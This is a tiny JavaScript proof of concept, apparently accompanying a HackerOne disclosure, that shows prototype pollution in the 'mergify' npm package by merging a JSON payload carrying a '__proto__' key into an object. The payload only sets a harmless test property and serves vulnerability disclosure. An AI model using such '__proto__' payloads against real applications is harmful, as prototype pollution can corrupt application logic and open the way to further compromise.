//https://hackerone.com/reports/439098
 
  const mergify = require("mergify");
  const payload = '{"__proto__":{"polluted":"yes"}}';

   

  mergify({}, JSON.parse(payload));
// End of file
